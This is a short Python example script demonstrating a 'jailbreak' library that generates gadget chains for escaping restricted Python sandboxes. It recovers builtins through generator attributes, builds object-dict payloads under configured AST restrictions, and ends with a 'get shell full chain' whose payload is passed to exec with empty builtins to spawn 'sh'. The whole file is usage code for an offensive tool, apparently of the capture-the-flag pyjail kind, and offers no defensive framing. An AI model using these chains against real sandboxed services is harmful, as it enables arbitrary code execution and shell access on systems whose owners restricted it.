import ast
import jailbreak

#example usage for accessing specific gadget as current python code
from jailbreak.gadgets.python import get_builtins
print(get_builtins.get_builtins__gi_builtins)

#example usage for gadget chains with the terminating gadget requiring parameters
payload = jailbreak.get_obj_dict("type(dict)")
print(payload)


#example usage for gadget chains with multi dependencies, and setting restrictions
jailbreak.config(provided=['type'], ast=[ast.GeneratorExp])
payload = jailbreak.get_builtins()
print(payload)


#example get shell full chain
jailbreak.config(provided=['sys'])
payload = jailbreak.get_shell("'sh'")
print(payload)
#import sys
#exec(payload, {'__builtins__': {}, 'sys': sys})